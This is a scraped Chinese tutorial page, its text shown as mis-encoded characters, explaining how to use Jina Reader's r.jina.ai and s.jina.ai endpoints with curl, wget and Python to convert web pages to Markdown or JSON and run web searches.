                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1af662e4ae545d69f309d5a98688812~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768884354&amp;x-signature=Avdc4PteRWcoxAqboWhu%2FAjch9w%3D" alt="" loading="lazy"/></p>
<p>ä»ç½‘é¡µå’Œæ–‡æ¡£ä¸­æå–å¯ç”¨æ–‡æœ¬æ¯”çœ‹èµ·æ¥æ›´å…·æŒ‘æˆ˜æ€§ã€‚HTML é¡µé¢å°†æœ‰æ„ä¹‰çš„å†…å®¹ä¸å¸ƒå±€å…ƒç´ ã€è„šæœ¬ã€å¹¿å‘Šå’Œæ ·å¼è§„åˆ™æ··åˆåœ¨ä¸€èµ·ï¼Œè€Œ PDF æ–‡ä»¶åˆ™å›´ç»•æ‰“å°é€»è¾‘è¿›è¡Œç»“æ„åŒ–ï¼Œè€Œéè‡ªç„¶çš„æ–‡æœ¬æµã€‚å¦‚æœæ²¡æœ‰å¯é çš„æ–¹æ³•æ¥è§£æè¿™äº›æ ¼å¼ï¼Œå³ä½¿æ˜¯ç®€å•çš„æå–ä¹Ÿå¯èƒ½å˜å¾—ä¸ä¸€è‡´ä¸”éš¾ä»¥è‡ªåŠ¨åŒ–ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fjina.ai%2Freader%2F" title="https://jina.ai/reader/" target="_blank" ref="nofollow noopener noreferrer">Reader</a> é€šè¿‡åƒæµè§ˆå™¨ä¸€æ ·ç²¾ç¡®æ¸²æŸ“æºå†…å®¹ï¼Œç„¶åä»å®Œå…¨è§£æåçš„æ–‡æ¡£ä¸­æå–æ–‡æœ¬æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚è¿™ç§æ–¹æ³•é¿å…äº†çŒœæµ‹ï¼Œå¹¶èƒ½åœ¨å„ç§çœŸå®ä¸–ç•Œçš„ç½‘ç«™å’Œæ–‡ä»¶ä¸­ç”Ÿæˆç¨³å®šçš„è¾“å‡ºã€‚</p>
<p>Jina Reader æœåŠ¡æä¾›ä¸¤ä¸ª endpointsï¼Œåˆ†åˆ«æä¾›ä¸åŒçš„æœåŠ¡ï¼š</p>
<ul>
<li>
<p><strong>r.jina.ai</strong>ï¼šé€šè¿‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Fr.jina.ai%2F" title="https://r.jina.ai/" target="_blank" ref="nofollow noopener noreferrer">r.jina.ai/</a> å°†ä»»ä½• URL è½¬æ¢ä¸º LLM-ready textï¼Œä¸ºä½ çš„ agents å’Œ RAG ç³»ç»Ÿç”Ÿæˆæ›´å¹²å‡€ã€æ›´å¯é çš„è¾“å…¥ã€‚</p>
</li>
<li>
<p><strong>s.jina.ai</strong>ï¼šé€šè¿‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Fs.jina.ai%2Fyour%2Bquery" title="https://s.jina.ai/your+query" target="_blank" ref="nofollow noopener noreferrer">s.jina.ai/your+query</a> å¯¹ä»»æ„æŸ¥è¯¢æ‰§è¡Œå®æ—¶ web searchï¼Œä½¿ä½ çš„ LLMs èƒ½å¤Ÿä»æ•´ä¸ª web è·å–æœ€æ–°ä¿¡æ¯ã€‚</p>
</li>
</ul>
<p>è¿™ä¸¤ä¸ª endpoints ç»“åˆåœ¨ä¸€èµ·ï¼Œä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç§ç®€å•ã€å¯é çš„æ–¹å¼ï¼Œåªéœ€ä¸€æ¬¡è¯·æ±‚ï¼Œå°±èƒ½å°†å¤æ‚çš„ HTML æˆ– PDF æºè½¬æ¢ä¸ºå¹²å‡€çš„ Markdown æˆ–ç»“æ„è‰¯å¥½çš„ JSONï¼Œä½¿ Reader æˆä¸ºä»»ä½•æ•°æ®æ‘„å–æˆ–å¤„ç† pipeline çš„å®ç”¨åŸºç¡€ã€‚</p>
<h2 data-id="heading-0">å¿«é€Ÿå¼€å§‹</h2>
<p>ä¸ºäº†å¿«é€Ÿäº†è§£ Readerï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨ä»»ä½• internet browserï¼Œè€Œæ— éœ€ç¼–å†™ä»»ä½•ä»£ç æˆ–é…ç½® API keyã€‚</p>
<p><strong>HTML â†’ Markdown</strong></p>
<p>æ‰“å¼€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Felasticsearch" title="https://www.elastic.co/elasticsearch" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/elasticsearâ€¦</a> ã€‚ä½ åº”è¯¥ä¼šçœ‹åˆ° Elasticsearch äº§å“é¡µé¢ï¼ˆæˆªå›¾æˆªè‡³ 2025 å¹´ 11 æœˆ 17 æ—¥ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a79bc40e2d654e9e8fd7711f41666793~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768884354&amp;x-signature=v8afqCEdBQgj2aPGsUNgfxiFdC0%3D" alt="" loading="lazy"/></p>
<p>ç°åœ¨é€šè¿‡ Reader æ‰“å¼€åŒä¸€ä¸ªé¡µé¢ï¼Œåªéœ€åœ¨ URL å‰åŠ ä¸Š r.jina.aiï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fr.jina.ai%2Fhttps%3A%2F%2Fwww.elastic.co%2Felasticsearch" title="https://r.jina.ai/https://www.elastic.co/elasticsearch" target="_blank" ref="nofollow noopener noreferrer">r.jina.ai/https://wwwâ€¦</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c63d645700674eb3937b0456ffcdfc31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768884354&amp;x-signature=35QRCuis4t%2BWMDvL4%2BF6mT%2BgSSQ%3D" alt="" loading="lazy"/></p>
<p>Reader ä¼šè¿”å›ä¸€ä¸ªä»¥ <strong>Markdown</strong> æ ¼å¼è¡¨ç¤ºé¡µé¢å†…å®¹çš„çº¯æ–‡æœ¬å“åº”ã€‚</p>
<p>é€šè¿‡ r.jina.ai åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è®¿é—® Reader æ˜¯ä¸€ç§æ–¹ä¾¿çš„å®éªŒæ–¹å¼ã€‚å…è´¹ã€æœªè®¤è¯çš„ä½¿ç”¨æ˜¯æœ‰é€Ÿç‡é™åˆ¶çš„ï¼Œå¹¶ä¸”å¯¹æŸäº› URL å¯èƒ½ä¼šå—åˆ°é™åˆ¶ã€‚å¯¹äºç”Ÿäº§ç¯å¢ƒæˆ–æ›´é«˜ä¼˜å…ˆçº§çš„å·¥ä½œæµï¼Œä½ åº”è¯¥ä½¿ç”¨å¸¦ API key çš„è®¤è¯ APIã€‚ä½ å¯ä»¥åœ¨ Jina Reader API ç½‘ç«™è·å–ä¸€ä¸ª API keyï¼Œå¹¶åœ¨ä¸‹ä¸€èŠ‚æ‰€ç¤ºçš„è¯·æ±‚å¤´ä¸­æ’å…¥å®ƒã€‚</p>
<h2 data-id="heading-1">ä½¿ç”¨ Reader</h2>
<h3 data-id="heading-2">å°†é¡µé¢è½¬æ¢ä¸º Markdown</h3>
<p>ä½¿ç”¨ Reader çš„æœ€ç®€å•æ–¹å¼æ˜¯å°†ä¸€ä¸ª URL ä¼ ç»™ <a href="https://link.juejin.cn?target=https%3A%2F%2Fr.jina.ai%2F%25EF%25BC%258C%25E5%25B9%25B6%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BB%25BB%25E4%25BD%2595%25E5%258F%25AF%25E8%25AE%25BF%25E9%2597%25AE%25E4%25BA%2592%25E8%2581%2594%25E7%25BD%2591%25E7%259A%2584%25E5%25B7%25A5%25E5%2585%25B7%25E4%25BF%259D%25E5%25AD%2598%25E8%25BE%2593%25E5%2587%25BA%25E3%2580%2582" title="https://r.jina.ai/%EF%BC%8C%E5%B9%B6%E4%BD%BF%E7%94%A8%E4%BB%BB%E4%BD%95%E5%8F%AF%E8%AE%BF%E9%97%AE%E4%BA%92%E8%81%94%E7%BD%91%E7%9A%84%E5%B7%A5%E5%85%B7%E4%BF%9D%E5%AD%98%E8%BE%93%E5%87%BA%E3%80%82" target="_blank" ref="nofollow noopener noreferrer">r.jina.ai/</a>Â å¹¶ä½¿ç”¨ä»»ä½•å¯è®¿é—®äº’è”ç½‘çš„å·¥å…·ä¿å­˜è¾“å‡ºã€‚</p>
<p>ä½¿ç”¨ curlï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  curl "https://r.jina.ai/https://www.elastic.co/elasticsearch" \
<span class="hljs-bullet">2.</span>     -o elasticsearch.md

`AIå†™ä»£ç 
</code></pre>
<p>è¿™é‡Œï¼Œæ ‡å¿—å’Œå‚æ•° <code>-o elasticsearch.md</code> ä¼šæŠŠç»“æœå†™å…¥ä¸€ä¸ªåä¸º <code>elasticsearch.md</code> çš„æœ¬åœ°æ–‡ä»¶ã€‚</p>
<p>ä½¿ç”¨ wgetï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  wget \
<span class="hljs-bullet">2.</span>    --header="X-Return-Format: markdown" \
<span class="hljs-bullet">3.</span>    -O elasticsearch.md \
<span class="hljs-bullet">4.</span>    "https://r.jina.ai/https://www.elastic.co/elasticsearch"

`AIå†™ä»£ç 
</code></pre>
<p>å‚æ•° <code>-O elasticsearch.md</code> ä¼šæŠŠç»“æœå†™å…¥æŒ‡å®šçš„æ–‡ä»¶ã€‚</p>
<p>ä½¿ç”¨ Pythonï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  import requests

<span class="hljs-bullet">3.</span>  headers = {
<span class="hljs-bullet">4.</span>      "X-Return-Format": "markdown",
<span class="hljs-bullet">5.</span>  }

<span class="hljs-bullet">7.</span>  response = requests.get(
<span class="hljs-bullet">8.</span>      "https://r.jina.ai/https://www.elastic.co/elasticsearch",
<span class="hljs-bullet">9.</span>      headers=headers,
<span class="hljs-bullet">10.</span>  )
<span class="hljs-bullet">11.</span>  print(response.text)

`AIå†™ä»£ç ![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</code></pre>
<p>è¿™æ®µä»£ç ä¼šæŠŠç»“æœæ‰“å°åˆ°å±å¹•ä¸Šã€‚</p>
<p>æˆ‘ä»¬è¿˜æä¾›<a href="https://link.juejin.cn?target=https%3A%2F%2Fjina.ai%2Freader%2F%23apiform" title="https://jina.ai/reader/#apiform" target="_blank" ref="nofollow noopener noreferrer">ä¸€ä¸ªäº¤äº’å¼ç•Œé¢</a>ï¼Œè®©ä½ å¯ä»¥å°è¯•ä¸åŒçš„å‚æ•°è®¾ç½®ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆå…¶ä»–ç¼–ç¨‹è¯­è¨€çš„ç¤ºä¾‹ä»£ç ã€‚</p>
<h3 data-id="heading-3">è®¤è¯ä½¿ç”¨å’Œè¾“å‡ºæ¨¡å¼</h3>
<p>å¦‚æœä½ éœ€è¦æ›´é«˜ä¼˜å…ˆçº§çš„è®¿é—®å’Œæ›´å°‘çš„é™åˆ¶ï¼Œè¯·åœ¨ Authorization header ä¸­åŒ…å«ä½ çš„ Jina API keyï¼ˆå°†ä¸‹é¢ç¤ºä¾‹ä¸­çš„ YOUR_API_KEY æ›¿æ¢ä¸ºä½ çš„ keyï¼‰ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ X-Return-Format å¯é€‰åœ°æŒ‡å®šæ˜ç¡®çš„è¾“å‡ºæ¨¡å¼ã€‚</p>
<p>ä½¿ç”¨ curlï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  curl "https://r.jina.ai/https://www.elastic.co/elasticsearch" \
<span class="hljs-bullet">2.</span>    -H "Authorization: Bearer YOUR<span class="hljs-emphasis">_API_</span>KEY" \
<span class="hljs-bullet">3.</span>    -H "X-Return-Format: markdown" \
<span class="hljs-bullet">4.</span>    -o elasticsearch.md

`AIå†™ä»£ç 
</code></pre>
<p>ä½¿ç”¨ wgetï¼š</p>
<pre><code class="hljs language-ini" lang="ini">`

1.  wget \
<span class="hljs-attr">2.    --header</span>=<span class="hljs-string">"Authorization: Bearer YOUR_API_KEY"</span> \
<span class="hljs-attr">3.    --header</span>=<span class="hljs-string">"X-Return-Format: markdown"</span> \
4.    -O elasticsearch.md \
5.    "https://r.jina.ai/https://www.elastic.co/elasticsearch"

`AIå†™ä»£ç 
</code></pre>
<p>ä½¿ç”¨ <strong>Python</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  import requests

<span class="hljs-bullet">3.</span>  headers = {
<span class="hljs-bullet">4.</span>      "Authorization": "Bearer YOUR<span class="hljs-emphasis">_API_</span>KEY",
<span class="hljs-bullet">5.</span>      "X-Return-Format": "markdown",
<span class="hljs-bullet">6.</span>  }

<span class="hljs-bullet">8.</span>  response = requests.get(
<span class="hljs-bullet">9.</span>      "https://r.jina.ai/https://www.elastic.co/elasticsearch",
<span class="hljs-bullet">10.</span>      headers=headers,
<span class="hljs-bullet">11.</span>  )
<span class="hljs-bullet">12.</span>  print(response.text)

`AIå†™ä»£ç ![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</code></pre>
<h3 data-id="heading-4">JSON æ¨¡å¼</h3>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œä½ å¯èƒ½æ›´å¸Œæœ›å°† Reader çš„è¾“å‡ºåŒ…è£…æˆä¸€ä¸ª JSON å¯¹è±¡ï¼Œè¿™æ ·æ›´å®¹æ˜“è§£æã€‚è¦åœ¨ r.jina.ai ä¸Šå¯ç”¨ JSON æ¨¡å¼ï¼Œè¯·æ·»åŠ è¯·æ±‚å¤´ Accept: application/jsonã€‚ä¾‹å¦‚ï¼Œåœ¨ Python ä¸­ï¼š</p>
<pre><code class="hljs language-json" lang="json">`

<span class="hljs-number">1.</span>  headers = <span class="hljs-punctuation">{</span>
<span class="hljs-number">2.</span>      <span class="hljs-attr">"Authorization"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Bearer &lt;YOUR_API_KEY&gt;"</span><span class="hljs-punctuation">,</span>
<span class="hljs-number">3.</span>      <span class="hljs-attr">"X-Return-Format"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"markdown"</span><span class="hljs-punctuation">,</span>
<span class="hljs-number">4.</span>      <span class="hljs-attr">"Accept"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"application/json"</span><span class="hljs-punctuation">,</span>
<span class="hljs-number">5.</span>  <span class="hljs-punctuation">}</span>

`AIå†™ä»£ç 
</code></pre>
<p>å¯¹äº curlï¼Œä½¿ç”¨æ ‡å¿— <code>-H "Authorization: Bearer &lt;YOUR_API_KEY&gt;"</code>ï¼›å¯¹äº wgetï¼Œä½¿ç”¨ <code>--header="Authorization: Bearer &lt;YOUR_API_KEY&gt;"</code>ï¼Œå¦‚ä¸Šä¾‹æ‰€ç¤ºï¼Œå°† header æ·»åŠ åˆ°è¯·æ±‚ä¸­ã€‚ç”Ÿæˆçš„ JSON è¾“å‡ºæ ¸å¿ƒéƒ¨åˆ†å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  {
2.    <span class="hljs-string">"code"</span>: 200,
3.    <span class="hljs-string">"status"</span>: 20000,
4.    <span class="hljs-string">"data"</span>: {
5.      <span class="hljs-string">"title"</span>: <span class="hljs-string">"..."</span>,
6.      <span class="hljs-string">"description"</span>: <span class="hljs-string">"..."</span>,
7.      <span class="hljs-string">"url"</span>: <span class="hljs-string">"https://www.elastic.co/elasticsearch"</span>,
8.      <span class="hljs-string">"content"</span>: <span class="hljs-string">"..."</span>   
9.    }
10.  }

`AIå†™ä»£ç ![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>æœ‰å…³é€šè¿‡ <a href="https://link.juejin.cn?target=http%3A%2F%2Fr.jina.ai%2F" title="http://r.jina.ai/" target="_blank" ref="nofollow noopener noreferrer">r.jina.ai</a> æä¾›çš„æœåŠ¡çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fjina.ai%2Freader%2F%23apiform" title="https://jina.ai/reader/#apiform" target="_blank" ref="nofollow noopener noreferrer">Reader API æ–‡æ¡£é¡µé¢</a>ã€‚</p>
<h3 data-id="heading-5">ä½¿ç”¨ s.jina.ai æœç´¢</h3>
<p>Reader â€”â€” é€šè¿‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Fs.jina.ai%2F" title="https://s.jina.ai/" target="_blank" ref="nofollow noopener noreferrer">s.jina.ai</a> API â€”â€” æ‰§è¡Œ web searchï¼šä½ æä¾›ä¸€ä¸ª queryï¼Œå®ƒä¼šå¤„ç†æ¥è‡ªæœç´¢å¼•æ“çš„ç»“æœã€‚å®ƒæä¾›çš„æœåŠ¡æ˜¯æ ‡å‡†åŒ– <strong>SERPs</strong>ï¼ˆSearch Engine Results Pageï¼‰ï¼šå³ä½ åœ¨ Google æˆ–å…¶ä»–æœç´¢å¼•æ“æœç´¢æ—¶å¾—åˆ°çš„ç»“æœé¡µé¢ã€‚SERP é€šå¸¸åŒ…å«ä¸€ç»„å¸¦æœ‰ snippetsã€é¢„è§ˆæ–‡æœ¬å’Œå°å‹ metadata å­—æ®µçš„é“¾æ¥ï¼Œä½†ç›´æ¥æå–å¾ˆå›°éš¾ï¼Œå› ä¸ºé¡µé¢é€šå¸¸è¿˜åŒ…å«å¹¿å‘Šä»¥åŠå¯é€‰æœåŠ¡æˆ–å…¶ä»–äº§å“çš„é“¾æ¥ã€‚</p>
<p>ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œåªéœ€æ£€ç´¢ä»¥ä¸‹ URLï¼Œå¹¶æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æŸ¥è¯¢è¯ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">`https:<span class="hljs-comment">//s.jina.ai/&lt;your search query&gt;`AIå†™ä»£ç </span>
</code></pre>
<p>å°†æŸ¥è¯¢è¯ä¹‹é—´çš„ç©ºæ ¼æ›¿æ¢ä¸º â€œ+â€ï¼Œå¦‚ä¸‹é¢çš„ç¤ºä¾‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">`https:<span class="hljs-comment">//s.jina.ai/Elastic+Jina+AI`AIå†™ä»£ç </span>
</code></pre>
<p>Reader API ä¼šåœ¨ Google ä¸Šæ‰§è¡Œä½ çš„æœç´¢ï¼Œå¹¶å°†ç»“æœå¤„ç†æˆç»“æ„åŒ–çš„ Markdown é¡µé¢ï¼Œå…¶ä¸­åŒ…å«å‰ 10 ä¸ªåŒ¹é…é¡¹çš„é¡µé¢æ ‡é¢˜ã€URLï¼Œä»¥åŠåº•å±‚æœç´¢å¼•æ“æä¾›çš„æè¿°/æ‘˜è¦ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒè¿˜ä¼šå°è¯•æŠ“å–ç½‘é¡µå¹¶å°†å…¶è½¬æ¢ä¸º Markdownï¼Œä½¿ç”¨ä¸ä¸Šè¿° HTML/PDF è½¬ Markdown è½¬æ¢å™¨ç›¸åŒçš„æ¨¡å‹ï¼Œä½†è¯·æ±‚å¯èƒ½å› è¶…æ—¶æˆ–å…¶ä»–åŸå› å¤±è´¥ï¼Œå› æ­¤é¡µé¢å¯èƒ½ä¸å­˜åœ¨ã€‚</p>
<p>ä¸æ‰€æœ‰ Reader API æœåŠ¡ä¸€æ ·ï¼Œå¦‚æœä½ ä½¿ç”¨ Jina API keyï¼Œä½ å°†è·å¾—æ›´é«˜ä¼˜å…ˆçº§ï¼Œå› æ­¤å¯ä»¥æ›´å¿«åœ°è·å¾—ç»“æœï¼Œæ— æµé‡é™åˆ¶ï¼Œä¹Ÿä¸ä¼šå› æµé‡è¿‡å¤§è€Œè¢«æ‹’ç»è¯·æ±‚ã€‚</p>
<p>ä¸€ä¸ªå…·ä½“ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">`curl <span class="hljs-string">"https://s.jina.ai/Elastic+Jina"</span> -H <span class="hljs-string">"Authorization: Bearer &lt;YOUR_API_KEY&gt;"</span>`AIå†™ä»£ç 
</code></pre>
<p>è¿™ä¼šè¿”å› Markdown æ ¼å¼çš„æ–‡æœ¬ï¼Œçœ‹èµ·æ¥å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  [<span class="hljs-number">1</span>] Title: Elastic <span class="hljs-keyword">and</span> Jina AI <span class="hljs-keyword">join</span> forces <span class="hljs-keyword">to</span> advance <span class="hljs-keyword">open</span> source retrieval <span class="hljs-keyword">for</span> AI ...
<span class="hljs-number">2.</span>  [<span class="hljs-number">1</span>] URL Source: https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.elastic.co<span class="hljs-operator">/</span>blog<span class="hljs-operator">/</span>elastic<span class="hljs-operator">-</span>jina<span class="hljs-operator">-</span>ai
<span class="hljs-number">3.</span>  [<span class="hljs-number">1</span>] Description: We <span class="hljs-keyword">are</span> thrilled <span class="hljs-keyword">to</span> announce that Elastic has joined forces <span class="hljs-keyword">with</span> Jina AI, a pioneer <span class="hljs-keyword">in</span> <span class="hljs-keyword">open</span> source multimodal <span class="hljs-keyword">and</span> multilingual embeddings, ...
<span class="hljs-number">4.</span>  [<span class="hljs-number">1</span>] <span class="hljs-type">Date</span>: Oct <span class="hljs-number">9</span>, <span class="hljs-number">2025</span>

<span class="hljs-number">7.</span>  [<span class="hljs-number">2</span>] Title: Elastic Completes Acquisition <span class="hljs-keyword">of</span> Jina AI, a Leader <span class="hljs-keyword">in</span> Frontier Models <span class="hljs-keyword">for</span> Multimodal <span class="hljs-keyword">and</span> Multilingual <span class="hljs-keyword">Search</span>
<span class="hljs-number">8.</span>  [<span class="hljs-number">2</span>] URL Source: https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>ir.elastic.co<span class="hljs-operator">/</span>news<span class="hljs-operator">/</span>news<span class="hljs-operator">-</span>details<span class="hljs-operator">/</span><span class="hljs-number">2025</span><span class="hljs-operator">/</span>Elastic<span class="hljs-operator">-</span>Completes<span class="hljs-operator">-</span>Acquisition<span class="hljs-operator">-</span><span class="hljs-keyword">of</span><span class="hljs-operator">-</span>Jina<span class="hljs-operator">-</span>AI<span class="hljs-operator">-</span>a<span class="hljs-operator">-</span>Leader<span class="hljs-operator">-</span><span class="hljs-keyword">in</span><span class="hljs-operator">-</span>Frontier<span class="hljs-operator">-</span>Models<span class="hljs-operator">-</span><span class="hljs-keyword">for</span><span class="hljs-operator">-</span>Multimodal<span class="hljs-operator">-</span><span class="hljs-keyword">and</span><span class="hljs-operator">-</span>Multilingual<span class="hljs-operator">-</span><span class="hljs-keyword">Search</span><span class="hljs-operator">/</span>default.aspx
<span class="hljs-number">9.</span>  [<span class="hljs-number">2</span>] Description: Acquisition advances Elasticâ€™s leadership <span class="hljs-keyword">in</span> retrieval, embeddings, <span class="hljs-keyword">and</span> context engineering <span class="hljs-keyword">to</span> power agentic AI Elastic (NYSE: ESTC), the <span class="hljs-keyword">Search</span> AI Company, has completed the acquisition <span class="hljs-keyword">of</span> Jina AI , a pioneer <span class="hljs-keyword">in</span> <span class="hljs-keyword">open</span> source multimodal <span class="hljs-keyword">and</span> multilingual embeddings, reranker, <span class="hljs-keyword">and</span> small <span class="hljs-keyword">language</span> models. The acquisition deepens Elasticâ€™s capabilities <span class="hljs-keyword">in</span> vector <span class="hljs-keyword">search</span>, retrieval<span class="hljs-operator">-</span>augmented generation (RAG), <span class="hljs-keyword">and</span> context engineering, further strengthening the companyâ€™s position <span class="hljs-keyword">as</span> the <span class="hljs-keyword">leading</span> <span class="hljs-keyword">Search</span> AI Platform <span class="hljs-keyword">for</span> developers <span class="hljs-keyword">and</span> enterprises. Elasticâ€™s addition <span class="hljs-keyword">of</span> Jina AI demonstrates its continued commitment <span class="hljs-keyword">to</span> delivering <span class="hljs-keyword">open</span>, accessible, <span class="hljs-keyword">and</span> production<span class="hljs-operator">-</span>ready <span class="hljs-keyword">Search</span> AI <span class="hljs-keyword">at</span> scale. â€œ<span class="hljs-keyword">Search</span> <span class="hljs-keyword">is</span> the foundation <span class="hljs-keyword">of</span> generative AI,â€ said Ash Kulkarni, CEO, Elastic . â€œJina AIâ€™s team <span class="hljs-keyword">and</span> technology bring cutting<span class="hljs-operator">-</span>edge models <span class="hljs-keyword">into</span> the Elastic ecosystem, making our platform even more powerful <span class="hljs-keyword">for</span> context engineering. Together, we <span class="hljs-keyword">are</span> expanding what developers <span class="hljs-keyword">and</span> enterprises can achieve <span class="hljs-keyword">with</span>
<span class="hljs-number">10.</span>  [<span class="hljs-number">2</span>] <span class="hljs-type">Date</span>: Oct <span class="hljs-number">9</span>, <span class="hljs-number">2025</span>

<span class="hljs-number">13.</span>  ### Elastic Completes Acquisition <span class="hljs-keyword">of</span> Jina AI, a Leader <span class="hljs-keyword">in</span> Frontier Models <span class="hljs-keyword">for</span> Multimodal <span class="hljs-keyword">and</span> Multilingual <span class="hljs-keyword">Search</span>

